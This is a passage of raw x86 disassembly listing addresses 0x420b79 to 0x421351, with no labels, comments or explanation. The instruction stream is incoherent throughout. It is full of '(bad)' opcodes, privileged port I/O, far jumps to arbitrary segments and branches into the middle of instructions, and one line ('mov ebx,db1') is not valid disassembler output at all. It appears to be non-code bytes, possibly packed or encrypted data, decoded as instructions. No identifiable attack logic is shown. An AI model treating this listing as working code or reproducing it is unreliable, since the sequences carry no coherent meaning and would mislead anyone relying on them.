  420b79:	pushf  
  420b7a:	sub    ebp,DWORD PTR [ebp+ebx*2+0x56f678ce]
  420b81:	xchg   edx,eax
  420b82:	inc    esp
  420b83:	sti    
  420b84:	cmp    dh,BYTE PTR [edi]
  420b86:	pop    edx
  420b87:	int3   
  420b88:	lea    ecx,[esi-0x36]
  420b8b:	sub    eax,0x63498ad7
  420b90:	sbb    ch,BYTE PTR [ebp+0x3a]
  420b93:	adc    edx,DWORD PTR [ecx-0x473fd9ff]
  420b99:	jp     0x420b82
  420b9b:	daa    
  420b9c:	pop    es
  420b9d:	cmp    ebp,DWORD PTR [edi+eiz*4+0x44]
  420ba1:	pop    ebp
  420ba2:	mov    ebp,0x10ccbb55
  420ba7:	cmc    
  420ba8:	push   0xffffffcf
  420baa:	push   edi
  420bab:	dec    ebx
  420bac:	mov    ch,0xaf
  420bae:	das    
  420baf:	dec    ecx
  420bb0:	push   edx
  420bb1:	sahf   
  420bb2:	push   es
  420bb3:	pop    esp
  420bb4:	add    bl,BYTE PTR [esi+0x4c]
  420bb7:	cmp    eax,0x927e8d6d
  420bbc:	in     eax,dx
  420bbd:	xchg   esi,edx
  420bbf:	lock stos BYTE PTR es:[edi],al
  420bc1:	jecxz  0x420b79
  420bc3:	test   DWORD PTR [edx+esi*2],edx
  420bc6:	xchg   DWORD PTR [ebx-0x2c],eax
  420bc9:	cli    
  420bca:	dec    ecx
  420bcb:	div    DWORD PTR [ebx+edx*4-0x6c]
  420bcf:	dec    ecx
  420bd0:	int    0xec
  420bd2:	xchg   ebx,eax
  420bd3:	enter  0xcc0d,0x37
  420bd7:	xor    bl,bl
  420bd9:	(bad)  
  420bdb:	stc    
  420bdc:	jne    0x420b7e
  420bde:	push   edi
  420bdf:	sbb    al,0xec
  420be1:	dec    esi
  420be2:	sbb    eax,0x54fad801
  420be7:	js     0x420bdb
  420be9:	fist   DWORD PTR [ebx]
  420beb:	mov    ebp,0xb701dbc3
  420bf0:	scas   al,BYTE PTR es:[edi]
  420bf1:	fcmovnb st,st(3)
  420bf3:	mov    esi,0xd57e87cc
  420bf8:	in     al,dx
  420bf9:	push   0xffffffcb
  420bfb:	push   ebp
  420bfc:	call   0xef9d47af
  420c01:	in     eax,0xad
  420c03:	ds mov dh,0xbd
  420c06:	xchg   esp,eax
  420c07:	mov    al,0x71
  420c09:	sub    ebx,ebp
  420c0b:	xor    BYTE PTR [ebx+0x46],bl
  420c0e:	int    0x25
  420c10:	add    eax,0xf30111ca
  420c15:	ret    0x7f74
  420c18:	call   0x34b93939
  420c1d:	sbb    dl,dh
  420c1f:	jp     0x420bc5
  420c21:	jle    0x420c3e
  420c23:	jb     0x420bd3
  420c25:	daa    
  420c26:	inc    esp
  420c27:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c29:	aas    
  420c2a:	mov    esi,0x5626bf96
  420c2f:	dec    eax
  420c30:	jg     0x420bd7
  420c32:	fwait
  420c33:	sar    BYTE PTR [esi-0x41],0x1
  420c37:	fsubr  st(5),st
  420c39:	inc    esp
  420c3a:	fld    TBYTE PTR [ecx+edx*4]
  420c3d:	xor    eax,DWORD PTR [edi-0x51]
  420c40:	sub    al,0x61
  420c42:	and    BYTE PTR ds:0xaa79c0f4,bh
  420c48:	int3   
  420c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c4a:	mov    ds:0x4fa76d99,eax
  420c4f:	out    0xde,eax
  420c51:	sbb    esi,DWORD PTR [ecx]
  420c53:	dec    edx
  420c54:	jge    0x420c19
  420c56:	retf   0xcef2
  420c59:	push   edi
  420c5a:	sahf   
  420c5b:	and    esi,DWORD PTR [eax+0x73]
  420c5e:	imul   ebp,DWORD PTR [eax+0x66],0x299270b6
  420c65:	add    ch,BYTE PTR [eax+edi*2+0x574ef5b1]
  420c6c:	aad    0xd5
  420c6e:	mov    ebp,0x9940ff3
  420c73:	mov    edi,0xb6a450fc
  420c78:	cmp    ah,BYTE PTR [ebx]
  420c7a:	shr    BYTE PTR [ebx-0x3f],0xb4
  420c7e:	rcl    DWORD PTR [eax+0x21],cl
  420c81:	(bad)  
  420c83:	outs   dx,BYTE PTR ds:[esi]
  420c84:	xor    al,0xd2
  420c86:	add    eax,0x25300037
  420c8b:	ret    0x2592
  420c8e:	jg     0x420cc0
  420c90:	push   ecx
  420c91:	retf   
  420c92:	jp     0x420c68
  420c94:	push   edx
  420c95:	or     eax,0x55b7bd60
  420c9a:	pop    edi
  420c9b:	jnp    0x420c80
  420c9d:	jge    0x420c5a
  420c9f:	outs   dx,BYTE PTR ds:[esi]
  420ca0:	out    dx,eax
  420ca1:	ds gs mov ecx,0xa447fa2f
  420ca8:	jmp    0xfe580353
  420cad:	mov    WORD PTR [eax+eiz*1+0x72],ds
  420cb1:	rol    DWORD PTR [ebx-0x53],1
  420cb4:	xor    eax,0xe1f2d50e
  420cb9:	cmp    al,BYTE PTR [ecx+0x4989a6af]
  420cbf:	push   cs
  420cc0:	sub    DWORD PTR [ebx+0x36],0x2870fcb6
  420cc7:	ds adc eax,0x69cc9967
  420ccd:	nop
  420cce:	mov    esp,0x12ea1493
  420cd3:	adc    dh,bl
  420cd5:	xor    BYTE PTR [edx-0x3d080e03],0xfd
  420cdc:	add    al,0x61
  420cde:	push   esp
  420cdf:	call   0x5840b5be
  420ce4:	pop    es
  420ce5:	add    DWORD PTR [ebp-0x2e],esi
  420ce8:	pop    ds
  420ce9:	cmc    
  420cea:	fstp   TBYTE PTR [ecx]
  420ced:	sbb    edx,DWORD PTR [eax+ecx*4]
  420cf0:	mov    esi,0x6f8bde9f
  420cf5:	mov    esp,0x9bd4fc3c
  420cfa:	(bad)  
  420cfb:	fst    DWORD PTR [eax+0xb9fa9e]
  420d01:	std    
  420d02:	rcl    ch,cl
  420d04:	repz fadd DWORD PTR [eax-0x14]
  420d08:	adc    al,0xf9
  420d0a:	call   0x397b:0xdec7fad1
  420d11:	std    
  420d12:	dec    eax
  420d13:	dec    ecx
  420d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d15:	sahf   
  420d16:	pop    ebp
  420d17:	mov    dl,0x71
  420d19:	lock cwde 
  420d1b:	(bad)  
  420d1c:	scas   eax,DWORD PTR es:[edi]
  420d1d:	aam    0x3c
  420d1f:	sub    DWORD PTR [edi+edi*8],edi
  420d22:	daa    
  420d23:	jb     0x420ca9
  420d25:	inc    edi
  420d26:	shl    BYTE PTR [ebp-0x348236e4],0xbe
  420d2d:	inc    ebx
  420d2e:	mov    ds:0xc8921dc6,al
  420d33:	outs   dx,BYTE PTR ds:[esi]
  420d34:	push   ebp
  420d35:	inc    edx
  420d36:	lds    esi,FWORD PTR [ebx+0x5f]
  420d39:	stc    
  420d3a:	(bad)  
  420d3e:	fstp   DWORD PTR [edx-0x4d]
  420d41:	or     dh,dh
  420d43:	cld    
  420d44:	je     0x420cf3
  420d46:	gs mov ebx,0x1ae761f6
  420d4c:	stc    
  420d4d:	out    dx,al
  420d4e:	inc    esp
  420d4f:	push   edi
  420d50:	dec    ebx
  420d51:	(bad)  
  420d52:	mov    edi,0x81d97725
  420d57:	(bad)  
  420d58:	fidiv  DWORD PTR [ecx]
  420d5a:	data16 in al,dx
  420d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d5d:	fwait
  420d5e:	or     bl,BYTE PTR [ebp+0x6a35205e]
  420d64:	add    eax,0x1c1912b6
  420d69:	add    eax,0x1cd72428
  420d6e:	cwde   
  420d6f:	xor    al,0x8f
  420d71:	push   eax
  420d72:	int3   
  420d73:	cmp    ah,BYTE PTR [esi+0x43]
  420d76:	rol    DWORD PTR [ebp-0x5541e77b],1
  420d7c:	in     al,dx
  420d7d:	sub    dh,dl
  420d7f:	jmp    0x420d78
  420d81:	and    eax,0xcfd14e8f
  420d86:	fist   DWORD PTR [esi]
  420d88:	mov    al,0x8f
  420d8a:	xchg   esp,eax
  420d8b:	test   BYTE PTR [ecx-0x36cd020a],ch
  420d91:	sbb    al,0x56
  420d93:	xor    eax,0x861a4bd5
  420d98:	push   edi
  420d99:	or     DWORD PTR [ebx+0x2b],ecx
  420d9c:	test   al,0xd3
  420d9e:	ret    0xc247
  420da1:	pop    ss
  420da2:	(bad)  
  420da3:	lock xacquire xor DWORD PTR [eax],edi
  420da7:	dec    edx
  420da8:	jg     0x420da3
  420daa:	mov    dh,0xd2
  420dac:	fst    QWORD PTR [edx+0x66eff123]
  420db2:	sub    edi,DWORD PTR [ecx-0xb5a3e44]
  420db8:	sbb    eax,0x62abdbed
  420dbd:	(bad)
  420dc0:	sbb    dh,BYTE PTR [eax-0x60a0e1d6]
  420dc6:	dec    DWORD PTR [edi-0x2a]
  420dc9:	mov    ds:0xddcf58cc,al
  420dce:	enter  0xe9da,0x5a
  420dd2:	inc    eax
  420dd3:	pop    ebp
  420dd4:	das    
  420dd5:	xchg   ecx,eax
  420dd6:	clc    
  420dd7:	push   0xfcb95ad3
  420ddc:	cmp    cl,al
  420dde:	mov    ah,0xc2
  420de0:	mov    dl,dh
  420de2:	cli    
  420de3:	jg     0x420dd4
  420de5:	xchg   esi,eax
  420de6:	fisttp WORD PTR [esi]
  420de8:	js     0x420d77
  420dea:	sbb    al,0x44
  420dec:	add    DWORD PTR [edi-0x2e],eax
  420def:	ficomp WORD PTR [edi+eiz*4+0x63]
  420df3:	sar    DWORD PTR [edi],0x64
  420df6:	int3   
  420df7:	fsubr  DWORD PTR [edx]
  420df9:	pop    ebp
  420dfa:	adc    BYTE PTR [ecx+0x28299e46],bl
  420e00:	icebp  
  420e01:	add    edx,DWORD PTR [ecx+0x57]
  420e04:	outs   dx,DWORD PTR ds:[esi]
  420e05:	dec    edi
  420e06:	les    esp,FWORD PTR [edx+esi*1+0x3d]
  420e0a:	int3   
  420e0b:	pop    ss
  420e0c:	stc    
  420e0d:	(bad)  
  420e0e:	cmp    al,BYTE PTR [esi]
  420e10:	sbb    al,0x45
  420e12:	xchg   DWORD PTR [edx+0x2a],edx
  420e15:	rol    eax,cl
  420e17:	arpl   WORD PTR [edi-0x55241e38],bx
  420e1d:	mov    al,ds:0xdcf3329b
  420e22:	les    eax,FWORD PTR [eax+0x48b019f3]
  420e28:	cmp    ch,BYTE PTR [edi]
  420e2a:	push   edx
  420e2b:	inc    edi
  420e2c:	into   
  420e2d:	fs aam 0x58
  420e30:	ins    DWORD PTR es:[edi],dx
  420e31:	adc    eax,0x49c4dae2
  420e36:	jmp    0x526a:0xf40fc3b1
  420e3d:	cmp    ah,cl
  420e3f:	aad    0x46
  420e41:	xchg   DWORD PTR ss:[edi],esp
  420e44:	loope  0x420df3
  420e46:	cwde   
  420e47:	loopne 0x420eb8
  420e49:	std    
  420e4a:	fcom   st(2)
  420e4c:	imul   ecx,esp,0x751b5602
  420e52:	mov    ch,0x75
  420e54:	sub    eax,0x79de5a14
  420e59:	addr16 gs dec ebx
  420e5d:	out    0x20,eax
  420e5f:	test   eax,0x241c7022
  420e64:	jg     0x420ecf
  420e66:	or     al,0x1f
  420e68:	ror    ch,0xce
  420e6b:	sbb    dh,BYTE PTR [edx+esi*8]
  420e6e:	pop    eax
  420e6f:	pop    ebp
  420e70:	add    eax,0x33e9a778
  420e75:	sub    cl,BYTE PTR [edi-0x5b]
  420e78:	mul    dl
  420e7a:	mov    ebp,0x74d89142
  420e7f:	gs jmp 0x420e9c
  420e82:	sbb    DWORD PTR [ecx+edx*4+0x8c0864a],ecx
  420e89:	mov    eax,0x79f055af
  420e8e:	fld    TBYTE PTR [esi+0x219ed925]
  420e94:	add    DWORD PTR [esi+0x48],0xea5e83a0
  420e9b:	imul   cl
  420e9d:	jecxz  0x420ed2
  420e9f:	sub    BYTE PTR [edx-0x1a],bh
  420ea2:	scas   eax,DWORD PTR es:[edi]
  420ea3:	jl     0x420e4e
  420ea5:	xchg   esi,eax
  420ea6:	in     al,dx
  420ea7:	and    eax,0x992636ef
  420eac:	add    eax,0x87326270
  420eb1:	pop    ebx
  420eb2:	retf   
  420eb3:	sbb    ch,BYTE PTR [ecx]
  420eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb6:	xor    al,0xb7
  420eb8:	mov    esp,ecx
  420eba:	stos   BYTE PTR es:[edi],al
  420ebb:	xor    eax,0x9acb7f27
  420ec0:	push   ebx
  420ec1:	loope  0x420f01
  420ec3:	idiv   al
  420ec5:	lds    eax,FWORD PTR [edx+0x3]
  420ec8:	addr16 xchg al,al
  420ecb:	(bad)  
  420ecc:	pop    ebx
  420ecd:	xlat   BYTE PTR ds:[ebx]
  420ece:	call   0x9e9b8383
  420ed3:	mov    esp,0xa88cd1ee
  420ed8:	in     eax,0xb7
  420eda:	inc    ebx
  420edb:	cli    
  420edc:	cmp    al,0x72
  420ede:	(bad)  
  420edf:	pop    esi
  420ee0:	dec    eax
  420ee1:	inc    eax
  420ee2:	das    
  420ee3:	(bad)  
  420ee4:	into   
  420ee5:	sbb    DWORD PTR [eax+0x62],edi
  420ee8:	fcomp  QWORD PTR [ecx]
  420eea:	ror    DWORD PTR [eax],1
  420eec:	push   ecx
  420eed:	xchg   DWORD PTR [esi],esi
  420eef:	push   cs
  420ef0:	cmp    esi,DWORD PTR [ebx-0x4ebf37af]
  420ef6:	cmp    al,0x57
  420ef8:	mov    bh,0xeb
  420efa:	xchg   esi,eax
  420efb:	dec    edi
  420efc:	sub    al,0x7f
  420efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eff:	xor    eax,ebp
  420f01:	(bad)  
  420f02:	in     al,0x3b
  420f04:	mov    edi,DWORD PTR [edx]
  420f06:	popa   
  420f07:	aaa    
  420f08:	(bad)  
  420f09:	xchg   esi,eax
  420f0a:	je     0x420f0b
  420f0c:	es jnp 0x420f76
  420f0f:	xor    eax,0x1a701ac4
  420f14:	adc    ch,BYTE PTR [ecx+0x42]
  420f17:	mov    eax,0x4a875616
  420f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f1d:	int    0x96
  420f1f:	mov    eax,ds:0xce853a58
  420f24:	jle    0x420ef5
  420f26:	lahf   
  420f27:	xchg   ecx,eax
  420f28:	jnp    0x420f86
  420f2a:	lea    esp,[esi-0x15ffb100]
  420f30:	jl     0x420f61
  420f32:	adc    eax,0x6ccc0883
  420f37:	(bad)  
  420f38:	cmp    cl,cl
  420f3a:	push   esi
  420f3b:	inc    eax
  420f3c:	ins    BYTE PTR es:[edi],dx
  420f3d:	daa    
  420f3e:	pop    edi
  420f3f:	out    dx,al
  420f40:	mov    edi,ecx
  420f42:	pop    ds
  420f43:	sbb    eax,0xaa408eab
  420f48:	stos   DWORD PTR es:[edi],eax
  420f49:	pusha  
  420f4a:	xchg   ecx,eax
  420f4b:	in     eax,dx
  420f4c:	pop    edx
  420f4d:	addr16 in al,0xa3
  420f50:	jl     0x420fc7
  420f52:	jp     0x420edf
  420f54:	loop   0x420f0f
  420f56:	retf   0x24e8
  420f59:	and    DWORD PTR [esi],esp
  420f5b:	shr    BYTE PTR [ebx],0x56
  420f5e:	pop    ds
  420f5f:	aad    0x3a
  420f61:	cld    
  420f62:	or     al,0xa1
  420f64:	and    BYTE PTR [edx],cl
  420f66:	mov    edx,0xd5cfb0b3
  420f6b:	daa    
  420f6c:	mov    edx,0x2a581f4e
  420f71:	out    dx,al
  420f72:	std    
  420f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f74:	mov    ebx,esp
  420f76:	lods   eax,DWORD PTR ds:[esi]
  420f77:	std    
  420f78:	hlt    
  420f79:	test   DWORD PTR [ecx],edi
  420f7b:	adc    DWORD PTR [edx],0x20235f67
  420f81:	adc    cl,dh
  420f83:	adc    esp,DWORD PTR [ecx+0x47]
  420f86:	out    dx,al
  420f87:	mov    ah,0x9
  420f89:	jmp    0x235:0x6f72786d
  420f90:	xor    DWORD PTR [edi-0x72],esp
  420f93:	rcr    cl,0xe5
  420f96:	cmp    al,0x36
  420f98:	pusha  
  420f99:	ret    
  420f9a:	lock xchg ecx,eax
  420f9c:	test   eax,0x37814841
  420fa1:	lods   eax,DWORD PTR ds:[esi]
  420fa2:	ret    
  420fa3:	std    
  420fa4:	mov    ecx,0xbf1f3345
  420fa9:	int3   
  420faa:	(bad)  
  420fab:	jp     0x421021
  420fad:	add    eax,0xe36a9092
  420fb2:	sub    ebx,DWORD PTR [eax]
  420fb4:	adc    BYTE PTR [eax+0x14],ch
  420fb7:	pop    eax
  420fb8:	push   edi
  420fb9:	rcl    BYTE PTR [ebx+0x9ddfec9],cl
  420fbf:	mov    eax,ds:0x1e5dc5d1
  420fc4:	jae    0x421035
  420fc6:	(bad)  
  420fc7:	xchg   ebp,eax
  420fc8:	nop
  420fc9:	and    al,0x22
  420fcb:	ja     0x420fb3
  420fcd:	sbb    eax,0x17c9c512
  420fd2:	sbb    dl,ah
  420fd4:	std    
  420fd5:	in     eax,0x88
  420fd7:	adc    ecx,DWORD PTR [ecx-0x7f13c2af]
  420fdd:	into   
  420fde:	push   ds
  420fdf:	inc    esi
  420fe0:	in     eax,0x22
  420fe2:	adc    edi,edi
  420fe4:	add    esp,eax
  420fe6:	shr    BYTE PTR [ebx],0x85
  420fe9:	cld    
  420fea:	into   
  420feb:	inc    DWORD PTR [edx-0x106a285a]
  420ff1:	stos   BYTE PTR es:[edi],al
  420ff2:	icebp  
  420ff3:	pusha  
  420ff4:	mov    eax,ds:0x6686d69f
  420ff9:	and    BYTE PTR [esp+eiz*8-0x69f0f5c3],dl
  421000:	push   edi
  421001:	sub    ebx,edx
  421003:	(bad)  
  421005:	jb     0x42100f
  421007:	sbb    eax,0xfee5fa30
  42100c:	das    
  42100d:	adc    bl,BYTE PTR [edi-0x6c]
  421010:	into   
  421011:	dec    edx
  421012:	dec    esp
  421013:	mov    esp,0x775f3e43
  421018:	lds    ecx,FWORD PTR [eax-0x48]
  42101b:	mov    dl,0xa2
  42101d:	(bad)  [edi+edx*1-0x31a3a13a]
  421024:	push   esi
  421025:	mov    bh,0x35
  421027:	push   es
  421028:	fwait
  421029:	sar    DWORD PTR [eax+edi*2],cl
  42102c:	in     eax,dx
  42102d:	cmp    BYTE PTR [ebp+esi*8-0x34],0x61
  421032:	lods   al,BYTE PTR ds:[esi]
  421033:	jmp    0x16e44166
  421038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421039:	sub    al,0x25
  42103b:	dec    ebp
  42103c:	or     eax,0xbf6e977
  421041:	inc    ecx
  421042:	inc    ebx
  421043:	adc    DWORD PTR [edx],esi
  421045:	scas   eax,DWORD PTR es:[edi]
  421046:	(bad)  
  421047:	(bad)  
  421048:	loop   0x42103e
  42104a:	sahf   
  42104b:	fcom   DWORD PTR [ecx+0x45795081]
  421051:	fs fwait
  421053:	push   0x7f607e9c
  421058:	bound  edi,QWORD PTR [esi]
  42105a:	clc    
  42105b:	mov    ch,0x4
  42105d:	rol    BYTE PTR [ebx],1
  42105f:	mov    BYTE PTR [esi+0x32],bh
  421062:	mov    DWORD PTR [edx],eax
  421064:	aam    0x7d
  421066:	sub    BYTE PTR [eax],al
  421068:	gs popf 
  42106a:	pop    ds
  42106b:	int    0xc2
  42106d:	pop    ecx
  42106e:	inc    ebx
  42106f:	mov    esi,0xae9b8e4f
  421074:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421076:	mov    ebp,0x6f85e0c4
  42107b:	icebp  
  42107c:	std    
  42107d:	jg     0x4210b8
  42107f:	jp     0x421047
  421081:	sbb    al,0x42
  421083:	test   DWORD PTR [eax-0x12b03936],edi
  421089:	jge    0x421025
  42108b:	out    0xad,eax
  42108d:	or     DWORD PTR [edx],edx
  42108f:	xor    eax,0xfe7e83d2
  421094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421095:	enter  0x56d6,0x5
  421099:	cwde   
  42109a:	xchg   ecx,eax
  42109b:	xor    al,0x7
  42109d:	pop    ebp
  42109e:	xchg   BYTE PTR ds:0xf7ab2716,dl
  4210a4:	lods   eax,DWORD PTR ds:[esi]
  4210a5:	mov    al,0x6f
  4210a7:	mov    ebx,db1
  4210aa:	data16 (bad) 
  4210ac:	test   al,0x2
  4210ae:	sbb    al,0xc8
  4210b0:	jno    0x421032
  4210b2:	push   cs
  4210b3:	call   0x6404:0x4b98e337
  4210ba:	mov    dh,0x88
  4210bc:	call   0xa239efbc
  4210c1:	bound  eax,QWORD PTR [ecx-0x3f5ce115]
  4210c7:	int    0xcc
  4210c9:	popf   
  4210ca:	repnz and eax,0x94dc1126
  4210d0:	pop    ecx
  4210d1:	lds    ebp,FWORD PTR [edi+0x260d383d]
  4210d7:	and    DWORD PTR [edi+0x649b073e],ecx
  4210dd:	mov    ah,0x0
  4210df:	or     bl,bh
  4210e1:	or     ecx,DWORD PTR [ebx-0x12]
  4210e4:	fiadd  WORD PTR [esi-0x7b]
  4210e7:	stc    
  4210e8:	cmp    esp,DWORD PTR [ebp-0x12935cde]
  4210ee:	aad    0x45
  4210f0:	outs   dx,DWORD PTR ds:[esi]
  4210f1:	or     dh,BYTE PTR [ebp-0x565ea528]
  4210f7:	idiv   BYTE PTR [edx+0x59]
  4210fa:	cmc    
  4210fb:	adc    DWORD PTR [edx],0x47
  4210fe:	push   es
  4210ff:	jmp    0x9ef0927c
  421104:	fsub   QWORD PTR [esi+0x7ded3010]
  42110a:	cdq    
  42110b:	add    DWORD PTR [ebp+eax*4-0x3e79f494],ebx
  421112:	cmp    DWORD PTR [ecx+0x1ca0424e],esi
  421118:	test   al,0xb9
  42111a:	or     ch,BYTE PTR [ebx-0x7d6f8b5d]
  421120:	jmp    0x42118f
  421122:	inc    edi
  421123:	mov    edx,0x71669c31
  421128:	xor    bh,BYTE PTR [ebx+0x41]
  42112b:	shl    DWORD PTR [ebp-0x19247f4b],1
  421131:	mov    BYTE PTR [edx-0xd],ah
  421134:	push   cs
  421135:	or     al,BYTE PTR [esi]
  421137:	ret    
  421138:	add    ebx,DWORD PTR [edi-0x701c2b41]
  42113e:	div    BYTE PTR [ebx+ebx*8]
  421141:	mov    dl,0xe9
  421143:	cmp    ebp,edi
  421145:	nop
  421146:	dec    BYTE PTR [edx+ecx*2-0x3295d42c]
  42114d:	jmp    0x13fb:0xe21904bc
  421154:	nop
  421155:	aas    
  421156:	mov    al,ds:0x7565a3ab
  42115b:	popa   
  42115c:	mov    al,0x64
  42115e:	cmp    eax,0xc24e0977
  421163:	icebp  
  421164:	dec    edx
  421165:	inc    ebp
  421166:	test   eax,0x61308005
  42116b:	mov    ah,0xc0
  42116d:	mov    ds:0x17b4c25b,al
  421172:	jecxz  0x421199
  421174:	data16 mov ah,BYTE PTR [ecx]
  421177:	imul   esp,eax,0xbcee2b7a
  42117d:	mov    edi,0x5341e6ad
  421182:	pop    ds
  421183:	push   edx
  421184:	(bad)  
  421185:	fsub   QWORD PTR ds:0xb5798fb2
  42118b:	pop    ss
  42118c:	and    esi,DWORD PTR [ebp+0x73619473]
  421192:	sub    al,0x38
  421194:	push   es
  421195:	shl    cl,0x9c
  421198:	push   es
  421199:	das    
  42119a:	jne    0x421184
  42119c:	int    0x52
  42119e:	jle    0x421164
  4211a0:	(bad)  
  4211a1:	stos   DWORD PTR es:[edi],eax
  4211a2:	in     al,0xd3
  4211a4:	add    ecx,edi
  4211a6:	mov    ss,WORD PTR [ecx+0x0]
  4211a9:	in     al,0x10
  4211ab:	test   BYTE PTR [edi+0x18],0xa0
  4211af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211b0:	and    cl,BYTE PTR ds:0xe9b5570a
  4211b6:	scas   al,BYTE PTR es:[edi]
  4211b7:	pop    ss
  4211b8:	lea    ecx,[edi]
  4211ba:	pop    eax
  4211bb:	into   
  4211bc:	int    0x3c
  4211be:	sbb    ah,BYTE PTR [ebp+0x7c]
  4211c1:	out    dx,al
  4211c2:	jne    0x421206
  4211c4:	push   cs
  4211c5:	or     al,BYTE PTR [ebp-0x599b127f]
  4211cb:	or     al,0xff
  4211cd:	mov    edi,0xeb78b7e1
  4211d2:	clc    
  4211d3:	setp   BYTE PTR [edi]
  4211d6:	inc    esp
  4211d7:	imul   ecx,DWORD PTR [ebp+0x7bdbe7e0],0xabc0449
  4211e1:	outs   dx,DWORD PTR ds:[esi]
  4211e2:	jmp    0xf32045c1
  4211e7:	xor    DWORD PTR [edx],edi
  4211e9:	sar    dh,1
  4211eb:	sub    edx,edx
  4211ed:	push   0x1a7fe68d
  4211f2:	pop    es
  4211f3:	(bad)  
  4211f4:	jge    0x4211c4
  4211f6:	sti    
  4211f7:	fcmovu st,st(5)
  4211f9:	xchg   edi,eax
  4211fa:	sar    DWORD PTR [edi+0x4d2ea298],1
  421200:	es jo  0x4211f3
  421203:	pmaxsw mm5,QWORD PTR [eax]
  421206:	jae    0x42126b
  421208:	cmp    BYTE PTR [edx+eiz*1-0x5a0ce79b],al
  42120f:	sub    DWORD PTR [eax],0x80110981
  421215:	lahf   
  421216:	and    BYTE PTR [edi+0x5c4e494e],ch
  42121c:	mov    edi,0x6a5c90b0
  421221:	pop    ebp
  421222:	xchg   esi,eax
  421223:	or     bl,bl
  421225:	(bad)  
  421226:	and    al,0x98
  421228:	dec    edx
  421229:	aas    
  42122a:	lahf   
  42122b:	mov    dl,0x30
  42122d:	adc    BYTE PTR [ecx+0x3f989f3a],al
  421233:	dec    esi
  421234:	or     eax,0xe97c1ce6
  421239:	sub    DWORD PTR [esi-0x31d6fc4],eax
  42123f:	inc    edx
  421240:	sbb    al,0x1d
  421242:	sbb    BYTE PTR [eax+0x43],ch
  421245:	stos   BYTE PTR es:[edi],al
  421246:	mov    bh,0xe4
  421248:	sub    al,0xab
  42124b:	stos   DWORD PTR es:[edi],eax
  42124c:	popa   
  42124d:	outs   dx,BYTE PTR ds:[esi]
  42124e:	jo     0x421257
  421250:	and    eax,0x6c113fa1
  421255:	jg     0x42122e
  421257:	push   esp
  421258:	inc    BYTE PTR [edi]
  42125a:	jl     0x421226
  42125c:	mov    dl,BYTE PTR [edx+eiz*8+0x5]
  421260:	out    dx,al
  421261:	mov    ch,bl
  421263:	pushf  
  421264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421266:	inc    edi
  421267:	mov    esp,DWORD PTR [eax+0xb]
  42126a:	pop    ecx
  42126b:	mov    al,0xa5
  42126d:	add    eax,DWORD PTR [ebx]
  42126f:	pushf  
  421270:	mov    ecx,0x7479a3df
  421275:	mov    al,ds:0xabc63a84
  42127a:	mov    bh,0x85
  42127c:	loope  0x42123b
  42127e:	pop    eax
  42127f:	inc    ebx
  421280:	mov    al,ds:0xfe343ed8
  421285:	js     0x42123b
  421287:	add    ebp,DWORD PTR [eax]
  421289:	das    
  42128a:	std    
  42128b:	es push ss
  42128d:	mov    al,ds:0xb9254369
  421292:	ss (bad) 
  421294:	push   ebx
  421295:	pop    ss
  421296:	(bad)  
  421297:	and    DWORD PTR [eax-0x53458936],ebx
  42129d:	cmp    al,0xc3
  42129f:	sbb    bl,dh
  4212a1:	push   ebp
  4212a2:	jne    0x421240
  4212a4:	dec    esp
  4212a5:	push   cs
  4212a6:	scas   al,BYTE PTR es:[edi]
  4212a7:	ret    
  4212a8:	xchg   BYTE PTR [ebx],al
  4212aa:	push   eax
  4212ab:	mov    esi,0x200f4b1d
  4212b0:	(bad)  
  4212b1:	out    dx,al
  4212b2:	and    al,0x6f
  4212b4:	stos   DWORD PTR es:[edi],eax
  4212b5:	fcomp  QWORD PTR [eax+eax*2+0x41]
  4212b9:	push   ebx
  4212ba:	adc    al,0xe1
  4212bc:	jmp    0x58d39ef8
  4212c1:	in     eax,0xfe
  4212c3:	jg     0xf5cb24d
  4212c9:	jg     0x42131d
  4212cb:	cld    
  4212cc:	mov    ds:0x4af04ecf,al
  4212d1:	popf   
  4212d2:	shr    DWORD PTR ds:0xa3275fc5,0xe2
  4212d9:	dec    edx
  4212da:	(bad)
  4212de:	cs dec edi
  4212e0:	das    
  4212e1:	ret    0x92
  4212e4:	mov    edi,0x4e72a273
  4212e9:	cmc    
  4212ea:	and    edx,DWORD PTR [ebx+0x42720889]
  4212f0:	dec    bx
  4212f2:	mov    dh,0xc4
  4212f4:	sbb    edi,DWORD PTR [ebx+edx*8]
  4212f7:	xor    BYTE PTR [ebp+0x466f0d1],bl
  4212fd:	cmp    DWORD PTR [esp+edi*2],0xffffffe8
  421301:	fidiv  WORD PTR [ebx+ecx*8+0x1fcf2669]
  421308:	ret    0x532f
  42130b:	hlt    
  42130c:	ins    DWORD PTR es:[edi],dx
  42130d:	cmp    ch,cl
  42130f:	bound  eax,QWORD PTR [esi+eiz*2-0xd]
  421313:	inc    ebp
  421314:	push   edx
  421315:	loope  0x421394
  421317:	and    al,0x5
  421319:	inc    ebp
  42131a:	mov    ecx,edx
  42131c:	inc    esi
  42131d:	fsubr  DWORD PTR [ebx]
  42131f:	std    
  421320:	pop    ebp
  421321:	push   0xffffffe2
  421323:	adc    DWORD PTR [esi+0x3f],eax
  421326:	push   ds
  421327:	cmp    BYTE PTR [ebp-0x181b649d],dl
  42132d:	leave  
  42132e:	sbb    BYTE PTR [ecx],bh
  421330:	test   eax,0x50c8b0f6
  421335:	test   DWORD PTR [edx+0x2f],ebx
  421338:	jmp    0x4212da
  42133a:	and    eax,0x6f7b80c4
  42133f:	rcr    BYTE PTR ss:[eax-0x26],cl
  421343:	fidiv  WORD PTR [ebp+ebx*8-0x2b]
  421347:	and    al,0x6e
  421349:	dec    esi
  42134a:	call   0xb865c156
  42134f:	lods   eax,DWORD PTR ds:[esi]
  421350:	xchg   esi,eax
  421351:	test   eax,0x4452f419
